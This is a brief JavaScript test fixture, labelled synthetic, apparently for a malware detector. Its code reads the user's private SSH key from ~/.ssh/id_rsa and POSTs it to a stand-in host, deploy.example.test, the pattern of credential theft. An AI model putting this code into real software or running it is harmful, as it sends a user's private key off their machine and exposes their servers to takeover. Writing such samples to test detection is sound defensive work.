// FIXTURE ONLY — synthetic detection test sample, not real malware
// Demo: load your own key and send it to your own deploy host.
const fs = require("fs");
const https = require("https");
const helper = require("..");

const key = helper(fs.readFileSync(process.env.HOME + "/.ssh/id_rsa", "utf8"));
https.request("https://deploy.example.test/k", { method: "POST" }).end(key);
